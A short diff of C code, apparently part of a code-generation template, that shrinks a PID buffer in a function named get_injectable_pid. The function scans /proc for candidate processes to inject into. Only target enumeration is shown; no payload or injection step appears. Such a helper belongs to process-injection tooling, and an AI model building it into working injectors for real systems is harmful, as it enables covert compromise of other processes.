@@ -88,11 +88,11 @@ pid_t get_injectable_pid() {{
     }}
 
     struct dirent *entry;
-    pid_t pids[32768]; // Maximum number of process ID's in linux
+    pid_t pids[1000]; 
     int count = 0;
 
     // sniff through the /proc directory for valid PIDs
-    while ((entry = readdir(dir)) != NULL && count < 32768) {{
+    while ((entry = readdir(dir)) != NULL && count < 1000) {{
         if (entry->d_type == DT_DIR) {{
             pid_t pid = atoi(entry->d_name);
             if (pid > 0 && pid != getpid() && pid != 1) {{
